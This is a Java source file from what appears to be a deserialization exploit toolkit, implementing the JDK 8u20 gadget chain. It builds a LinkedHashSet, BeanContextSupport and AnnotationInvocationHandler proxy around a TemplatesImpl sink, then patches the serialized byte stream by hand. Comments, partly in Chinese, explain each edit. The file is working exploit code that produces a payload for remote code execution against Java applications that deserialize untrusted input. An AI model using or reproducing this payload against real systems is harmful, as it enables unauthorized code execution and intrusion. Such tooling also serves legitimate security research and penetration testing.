package com.ppp.chain.jdk;

import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.Printer;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Converter;
import com.ppp.utils.Reflections;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @author Whoopsunix
 * <p>
 * 通过 LinkedHashSet 构建
 * https://github.com/feihong-cs/jre8u20_gadget
 */
@Dependencies({"JDK:JDK8u20"})
@Authors({Authors.FEIHONG})
@Sink({Sink.TemplatesImpl})
public class JDK8u20_2 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(JDK8u20_2.class, args);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "x");

        InvocationHandler handler = KickOff.annotationInvocationHandler(map);
        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = KickOff.createProxy(handler, Templates.class);

        // can remove
        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object

        LinkedHashSet set = new LinkedHashSet();

        BeanContextSupport bcs = new BeanContextSupport();
        Class cc = Class.forName("java.beans.beancontext.BeanContextSupport");
        Field serializable = cc.getDeclaredField("serializable");
        serializable.setAccessible(true);
        serializable.set(bcs, 0);

        Field beanContextChildPeer = cc.getSuperclass().getDeclaredField("beanContextChildPeer");
        beanContextChildPeer.set(bcs, bcs);

        set.add(bcs);

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);

        oos.writeObject(set);
        oos.writeObject(handler);
        oos.writeObject(templates);
        oos.writeObject(proxy);
        oos.close();

        byte[] bytes = baous.toByteArray();
        Printer.log("Modify HashSet size from  1 to 3");
        bytes[89] = 3; //修改hashset的长度（元素个数）

        //调整 TC_ENDBLOCKDATA 标记的位置
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 & bytes[i + 3] == 0 &&
                    bytes[i + 4] == 120 && bytes[i + 5] == 120 && bytes[i + 6] == 115) {
                Printer.log("Delete TC_ENDBLOCKDATA at the end of HashSet");
                bytes = Converter.deleteAt(bytes, i + 5);
                break;
            }
        }


        //将 serializable 的值修改为 1
        //0x73 = 115, 0x78 = 120
        //0x73 for TC_OBJECT, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 120 && bytes[i + 1] == 0 && bytes[i + 2] == 1 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 115) {
                Printer.log("Modify BeanContextSupport.serializable from 0 to 1");
                bytes[i + 6] = 1;
                break;
            }
        }

        /**
         TC_BLOCKDATA - 0x77
         Length - 4 - 0x04
         Contents - 0x00000000
         TC_ENDBLOCKDATA - 0x78
         **/

        //把这部分内容先删除，再附加到 AnnotationInvocationHandler 之后
        //目的是让 AnnotationInvocationHandler 变成 BeanContextSupport 的数据流
        //0x77 = 119, 0x78 = 120
        //0x77 for TC_BLOCKDATA, 0x78 for TC_ENDBLOCKDATA
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 119 && bytes[i + 1] == 4 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 120) {
                Printer.log("Delete TC_BLOCKDATA...int...TC_BLOCKDATA at the End of BeanContextSupport");
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                bytes = Converter.deleteAt(bytes, i);
                break;
            }
        }

        /*
              serialVersionUID - 0x00 00 00 00 00 00 00 00
                  newHandle 0x00 7e 00 28
                  classDescFlags - 0x00 -
                  fieldCount - 0 - 0x00 00
                  classAnnotations
                    TC_ENDBLOCKDATA - 0x78
                  superClassDesc
                    TC_NULL - 0x70
              newHandle 0x00 7e 00 29
         */
        //0x78 = 120, 0x70 = 112
        //0x78 for TC_ENDBLOCKDATA, 0x70 for TC_NULL
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 0 && bytes[i + 1] == 0 && bytes[i + 2] == 0 && bytes[i + 3] == 0 &&
                    bytes[i + 4] == 0 && bytes[i + 5] == 0 && bytes[i + 6] == 0 && bytes[i + 7] == 0 &&
                    bytes[i + 8] == 0 && bytes[i + 9] == 0 && bytes[i + 10] == 0 && bytes[i + 11] == 120 &&
                    bytes[i + 12] == 112) {
                Printer.log("Add back previous delte TC_BLOCKDATA...int...TC_BLOCKDATA after invocationHandler");
                i = i + 13;
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x77);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x04);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x00);
                bytes = Converter.addAtIndex(bytes, i++, (byte) 0x78);
                break;
            }
        }

        //将 sun.reflect.annotation.AnnotationInvocationHandler 的 classDescFlags 由 SC_SERIALIZABLE 修改为 SC_SERIALIZABLE | SC_WRITE_METHOD
        //这一步其实不是通过理论推算出来的，是通过debug 以及查看 pwntester的 poc 发现需要这么改
        //原因是如果不设置 SC_WRITE_METHOD 标志的话 defaultDataEnd = true，导致 BeanContextSupport -> deserialize(ois, bcmListeners = new ArrayList(1))
        // -> count = ois.readInt(); 报错，无法完成整个反序列化流程
        // 没有 SC_WRITE_METHOD 标记，认为这个反序列流到此就结束了
        // 标记： 7375 6e2e 7265 666c 6563 --> sun.reflect...
        for (int i = 0; i < bytes.length; i++) {
            if (bytes[i] == 115 && bytes[i + 1] == 117 && bytes[i + 2] == 110 && bytes[i + 3] == 46 &&
                    bytes[i + 4] == 114 && bytes[i + 5] == 101 && bytes[i + 6] == 102 && bytes[i + 7] == 108) {
                Printer.log("Modify sun.reflect.annotation.AnnotationInvocationHandler -> classDescFlags from SC_SERIALIZABLE to " +
                        "SC_SERIALIZABLE | SC_WRITE_METHOD");
                i = i + 58;
                bytes[i] = 3;
                break;
            }
        }

        //加回之前删除的 TC_BLOCKDATA，表明 HashSet 到此结束
        Printer.log("Add TC_BLOCKDATA at end");
        bytes = Converter.addAtLast(bytes, (byte) 0x78);

        return bytes;
    }
}
